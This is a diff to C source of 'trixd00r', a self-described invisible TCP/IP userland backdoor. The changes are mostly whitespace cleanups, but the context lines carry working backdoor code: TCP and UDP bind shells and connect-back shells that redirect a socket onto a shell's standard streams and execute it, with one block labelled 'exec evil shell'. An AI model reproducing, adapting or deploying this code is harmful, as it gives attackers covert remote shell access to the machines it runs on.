@@ -3,7 +3,7 @@
  *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
  *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
  *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
- *                                            /___/ nullsecurity team          * 
+ *                                            /___/ nullsecurity team          *
  *                                                                             *
  * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
  *                                                                             *
@@ -50,13 +50,13 @@ void send_banner(shell_t *shell, unsigned char type)
 {
     char banner[920];
 
-    
+
     if (type == _BAN_WELCOME) {
         snprintf(banner, sizeof(banner), "%s%s", BAN_WELCOME1, BAN_WELCOME2);
     } else {
         snprintf(banner, sizeof(banner), "%s", BAN_BYE);
     }
-    
+
     xsendto(shell->cfd, banner, strlen(banner) + 1, 0,
             (struct sockaddr *) &shell->srv, sizeof(shell->srv));
 
@@ -100,13 +100,13 @@ static void tcp_bind_shell(ctrl_t *ctrl)
     shell->srv.sin_family = AF_INET;
     shell->srv.sin_addr.s_addr = htonl(INADDR_ANY);
     shell->srv.sin_port = htons(shell->port);
-    
+
     /* bind shell on given port, go to listen mode and accept connections */
     xbind(shell->lfd, (struct sockaddr *) &shell->srv, sizeof(shell->srv));
     xlisten(shell->lfd, 1024);
     len = sizeof(shell->cli);
     shell->cfd = xaccept(shell->lfd, (struct sockaddr *) &shell->cli, &len);
-    
+
     __VERBOSE_CONNECT_FROM;
 
     /* exec evil shell */
@@ -114,7 +114,7 @@ static void tcp_bind_shell(ctrl_t *ctrl)
     xclose(shell->lfd);
 
 
-	xdup2(shell->cfd, 0);
+        xdup2(shell->cfd, 0);
         xdup2(shell->cfd, 1);
         xdup2(shell->cfd, 2);
         sleep(1);
@@ -122,17 +122,17 @@ static void tcp_bind_shell(ctrl_t *ctrl)
         execl(SHELL, SHELL, NULL);
         __EXIT_SUCCESS;
     }
-	
-	sigset_t mask;
-	sigemptyset(&mask);
-	
-	struct timespec t;
-	t.tv_sec = 600;
-	t.tv_nsec = 0;
-	int w;
-	w = sigtimedwait(&mask, 0, &t);
-	printf("sigtimedwait return %d\n", w);
-	kill(shell->pid, 9);
+
+        sigset_t mask;
+        sigemptyset(&mask);
+
+        struct timespec t;
+        t.tv_sec = 600;
+        t.tv_nsec = 0;
+        int w;
+        w = sigtimedwait(&mask, 0, &t);
+        // printf("sigtimedwait return %d\n", w);
+        kill(shell->pid, 9);
 
     /* we are done, so we can close descriptors */
     xclose(shell->lfd);
@@ -150,7 +150,7 @@ static void tcp_connback_shell(ctrl_t *ctrl)
 
 
     __VERBOSE_CONNBACK_TCP;
-    
+
     /* create socket and fill in sockaddr_in {} */
     shell->cfd = xsocket(AF_INET, SOCK_STREAM, 0);
     xmemset(&shell->cli, 0x00, sizeof(shell->cli));
@@ -158,7 +158,7 @@ static void tcp_connback_shell(ctrl_t *ctrl)
     shell->cli.sin_addr.s_addr = inet_addr(shell->host);
     shell->cli.sin_port = htons(shell->port);
     len = sizeof(shell->cli);
-    
+
     /* connect back to client */
     xconnect(shell->cfd, (const struct sockaddr *) &shell->cli, len);
 
@@ -191,8 +191,8 @@ static void udp_bind_shell(ctrl_t *ctrl)
     socklen_t len = 0;
     char buffer[SOCKBUF];
     shell_t *shell = (shell_t *) ctrl->shell;
-    
-    
+
+
     __VERBOSE_BIND_UDP;
 
     /* create connection socket - remember we build a pipe because of UDP, so we
@@ -206,7 +206,7 @@ static void udp_bind_shell(ctrl_t *ctrl)
     shell->srv.sin_addr.s_addr = htonl(INADDR_ANY);
     shell->srv.sin_port = htons(shell->port);
     len = sizeof(shell->srv);
-   
+
     /* bind on given port */
     xbind(shell->cfd, (struct sockaddr *) &shell->srv, len);
 
@@ -268,7 +268,7 @@ static void udp_bind_shell(ctrl_t *ctrl)
         xclose(fd2[1]);
         xclose(shell->cfd);
     }
-    
+
     return;
 }
 
@@ -292,13 +292,13 @@ static void udp_connback_shell(ctrl_t *ctrl)
     shell->srv.sin_addr.s_addr = inet_addr(shell->host);
     shell->srv.sin_port = htons(shell->port);
     len = sizeof(shell->srv);
-    
+
     FD_ZERO(&readfds);
 
     /* connect back to client and send welcome banner */
     xconnect(shell->cfd, (struct sockaddr *) &shell->srv, len);
     __SEND_BANNER(_BAN_WELCOME);
-   
+
     /* build the pipe */
     xpipe(fd);
     xpipe(fd2);
@@ -322,12 +322,12 @@ static void udp_connback_shell(ctrl_t *ctrl)
     } else if (shell->pid > 0) {
         xclose(fd[1]);
         xclose(fd2[0]);
-        
+
         fcntl(shell->cfd, F_SETFL, O_NONBLOCK);
         fcntl(fd[0], F_SETFL, O_NONBLOCK);
-        
+
         highfd = (shell->cfd > fd[0]) ? shell->cfd: fd[0];
-        
+
         /* read and write back from pipe - client got connection already */
         for ( ; ; ) {
             FD_SET(shell->cfd, &readfds);
@@ -338,7 +338,7 @@ static void udp_connback_shell(ctrl_t *ctrl)
                             (struct sockaddr *) &shell->srv, &len);
             _pipe = read(fd[0], buffer, sizeof(buffer));
             sock = write(fd2[1], buffer, sock);
-            
+
             if (_pipe > 0) {
                 buffer[_pipe] = 0;
                 xsendto(shell->cfd, buffer, _pipe, 0,
